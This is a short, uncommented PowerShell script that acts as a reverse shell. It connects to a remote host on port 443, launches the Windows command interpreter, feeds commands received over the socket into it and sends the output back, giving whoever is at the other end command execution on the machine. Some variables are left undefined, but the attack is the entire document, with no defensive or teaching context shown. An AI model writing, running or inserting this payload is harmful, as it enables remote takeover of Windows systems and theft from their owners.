$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($hostName, 443)
$stream = $client.GetStream()
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = $env:ComSpec
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputStream = $process.StandardInput
$outputStream = $process.StandardOutput
$received = $stream.Read($buffer,0,$buffer.Length)
$inputStream.Write($encoding.GetString($buffer,0,$received))
$result = $outputStream.ReadToEnd()
$stream.Write($encoding.GetBytes($result),0,$result.Length)
